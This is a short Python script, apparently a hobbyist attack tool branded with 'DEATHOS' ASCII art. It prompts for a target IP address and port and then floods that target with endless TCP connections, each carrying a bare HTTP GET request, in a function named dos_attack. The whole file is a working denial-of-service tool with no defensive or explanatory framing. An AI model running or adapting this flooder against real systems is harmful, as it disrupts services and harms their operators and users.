import socket
import time
import colorama
from colorama import init, Fore
import os

# Initialize colorama
init(autoreset=True)

# Clear the screen
os.system('cls' if os.name == 'nt' else 'clear')

# ASCII art in red
ascii_art = Fore.RED + """
████████▄     ▄████████    ▄████████     ███        ▄█    █▄     ▄██████▄     ▄████████ 
███   ▀███   ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███   ███    ███ 
███    ███   ███    █▀    ███    ███    ▀███▀▀██   ███    ███   ███    ███   ███    █▀  
███    ███  ▄███▄▄▄       ███    ███     ███   ▀  ▄███▄▄▄▄███▄▄ ███    ███   ███        
███    ███ ▀▀███▀▀▀     ▀███████████     ███     ▀▀███▀▀▀▀███▀  ███    ███ ▀███████████ 
███    ███   ███    █▄    ███    ███     ███       ███    ███   ███    ███          ███ 
███   ▄███   ███    ███   ███    ███     ███       ███    ███   ███    ███    ▄█    ███ 
████████▀    ██████████   ███    █▀     ▄████▀     ███    █▀     ▀██████▀   ▄████████▀  
"""

print(ascii_art)

# Get the target IP address
target = input(Fore.RED + "Enter the target IP address: ")

# Get the target port
port = int(input(Fore.RED + "Enter the target port: "))

def dos_attack(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print(Fore.RED + "Packet sent to " + target + ":" + str(port))
        except:
            print(Fore.RED + "Failed to send packet to " + target + ":" + str(port))

dos_attack(target, port)

time.sleep(5)
print(Fore.RED + "Exiting...")
time.sleep(5)
